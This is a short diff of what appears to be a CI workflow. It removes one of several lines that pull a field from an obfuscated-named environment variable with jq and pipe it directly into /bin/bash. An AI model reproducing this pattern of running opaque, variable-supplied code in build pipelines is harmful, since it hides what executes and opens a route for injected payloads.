@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ebrnu1400" | jq -r .d1653 | /bin/bash
           echo $bsu6029 | jq -r .ws18 | /bin/bash
-          echo $jchex9644 | jq -r .rngv01912 | /bin/bash
           echo $y983 | jq -r .pg6905 | /bin/bash
           printf '%s' "$d98930" | jq -r .wr2042 | /bin/bash
 
